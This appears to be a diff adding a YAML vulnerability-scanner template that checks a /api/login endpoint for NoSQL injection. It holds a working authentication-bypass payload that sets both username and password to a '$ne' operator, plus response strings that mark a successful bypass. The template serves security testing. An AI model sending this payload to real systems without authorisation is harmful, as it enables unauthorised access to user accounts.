@@ -1,0 +1,24 @@
+name: NoSQL注入测试
+description: 测试NoSQL注入漏洞
+level: 高
+author: Test
+request:
+  method: POST
+  path: /api/login
+  params:
+    action: "authenticate"
+  headers:
+    Content-Type: "application/json"
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+  body: "{\"username\":{\"$ne\":\"invalid\"},\"password\":{\"$ne\":\"invalid\"}}"
+response:
+  matchType: contains
+  successIndicators:
+    - "login successful"
+    - "登录成功"
+    - "welcome"
+  errorIndicators:
+    - "invalid credentials"
+    - "用户名或密码错误"
+  statusCode: 200
